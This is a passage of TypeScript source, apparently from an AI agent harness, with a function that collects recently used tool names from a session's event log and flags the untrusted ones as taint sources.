  lookbackMin: number,
  trusted: readonly string[] = [],
  now: number = Date.now(),
): Taint {
  if (!(lookbackMin > 0)) return { tools: [], status: "off" };
  if (!db || !sessionId) return { tools: [], status: "unavailable" };
  try {
    const since = now - lookbackMin * 60_000;
    let names: string[];
    if (db.eventToolsSince) names = db.eventToolsSince(sessionId, since, 64);
    else if (db.eventsBySession)
      names = db
        .eventsBySession(sessionId, { categories: ["tool_call"], limit: FALLBACK_ROWS })
        .filter((e) => e.ts >= since && e.tool)
        .map((e) => e.tool as string);
    else return { tools: [], status: "unavailable" };
    const out = new Set<string>();
    for (const n of names) {
      const id = taintingTool(n, trusted);
      if (id) out.add(id);
      if (out.size >= 8) break;
    }
    return { tools: [...out], status: "ok" };
  } catch {
    return { tools: [], status: "unavailable" };
  }
}
